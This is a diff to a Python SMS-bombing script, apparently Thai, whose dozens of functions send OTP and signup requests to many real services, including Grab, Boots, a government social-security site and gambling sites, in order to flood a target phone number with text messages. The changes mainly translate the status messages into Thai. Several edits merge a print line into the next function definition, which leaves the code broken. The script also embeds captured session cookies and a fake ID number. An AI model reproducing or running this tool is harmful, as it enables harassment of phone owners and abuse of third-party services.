@@ -28,25 +28,20 @@ Alife City Developer ใช้ในการยิงเบอร์
 useragent = "Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
 def alifecity01():
     post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})
-    print (f"Send number {phone} | Success ✓")
-def alifecity02():
+    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")def alifecity02():
     post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")
-    print (f"Send number {phone} | Success ✓")
-    
+    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")    
 def alifecity03():
     post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"+66{phone[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": "dec"}})
-    print (f"Send number {phone} | Success ✓")
-   
+    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")   
    
 def alifecity1():
     post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
-    print (f"Send number {phone} | Success ✓")
-    
+    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")    
     
 def alifecity2():
     post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0})
-    print (f"Send number {phone} | Success ✓")
-    
+    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")    
 def alifecity3():
     post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",json={
   "on": {
@@ -60,41 +55,33 @@ def alifecity3():
 
 def alifecity4():
     post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": f"{phone[1:]}","password":"123456789Az"})
-    print (f"Send number {phone} | Success ✓")
-    
+    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")    
     
 def alifecity5():
     post("https://gccircularlivingshop.com/sms/sendOtp", json={"grant_type":"otp","username": "+66"+phone,"password":"","client":"ecommerce"})
-    print (f"Send number {phone} | Success ✓")
-    
+    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")    
 def alifecity6():
     post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value": phone,"country":"66"},"type":"mobile"})
-    print (f"Send number {phone} | Success ✓")
-
+    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
 def alifecity7():
     post("https://m.lucabet168.com/api/register-otp",json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})
-    print (f"Send number {phone} | Success ✓")
-    
+    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")    
 def alifecity8():
     post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": phone})
-    print (f"Send number {phone} | Success ✓")
-    
+    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")    
  
     
 def alifecity9():
     post("https://m.lavagame168.com/api/register-otp",headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","referer": "https://m.lavagame168.com/dashboard/login"},json={"brands_id":"5ffc0caa4d603200124e4eb1","agent_register":"5ffc0d5cdcd4f30012aec3d9","tel": phone})
-    print (f"Send number {phone} | Success ✓")
-    
+    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")    
 def alifecity10():
     post("https://ep789bet.net/auth/send_otp", data={"phone":f"{phone}"})
-    print (f"Send number {phone} | Success ✓")
-    
+    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")    
 def alifecity11():
     post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
         "language": "th"},headers={"accept": "application/json, text/plain, /",
 	    "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"})
-    print (f"Send number {phone} | Success ✓")
-    
+    print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")    
     
     
     
@@ -165,8 +152,7 @@ def alifecity22():
 	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")	
 def alifecity23():
 	 requests.get("https://www.baanandbeyond.com/registration_initiate?on%5Bcountry%5D=66&on%5Bvalue%5D="+phone+"&type=mobile")
-	 print (f"Send number {phone} | Success ✓")
-	 
+	 print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")	 
 def alifecity24():
 	requests.get("https://findclone.ru/register?phone=+66"+phone)
 	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")	
@@ -231,7 +217,7 @@ def alifecity39():
 	requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text
 	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")	
 def alifecity40():
-	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1FcoKQdx13oXJzaNv3R83CsdnjknYdWo3xvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkMM8ECLaq9zC4xgck6QUJACuAxDkZyouDAn3x68dTSiOm1K04QhdrprshvnxMM8ECLaq9zC4xgck6QUJACuAxDkZyouDAn33XmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
+	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh14AY1v2BjqP1YsNuQxbkroZWbgGfjqG6EovAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkMM8ECLaq9zC4xgck6QUJACuAxDkZyouDAn3x68dTSiOm1K04QhdrprshvnxMM8ECLaq9zC4xgck6QUJACuAxDkZyouDAn33XmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
 	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")	
 def alifecity41():
 	post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
@@ -270,7 +256,7 @@ def alifecity52():
 	requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text
 	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")	
 def alifecity53():
-	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1FcoKQdx13oXJzaNv3R83CsdnjknYdWo3xvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkMM8ECLaq9zC4xgck6QUJACuAxDkZyouDAn3x68dTSiOm1K04QhdrprshvnxMM8ECLaq9zC4xgck6QUJACuAxDkZyouDAn33XmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
+	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh14AY1v2BjqP1YsNuQxbkroZWbgGfjqG6EovAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkMM8ECLaq9zC4xgck6QUJACuAxDkZyouDAn3x68dTSiOm1K04QhdrprshvnxMM8ECLaq9zC4xgck6QUJACuAxDkZyouDAn33XmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
 	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")	
 def alifecity54():
 	post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
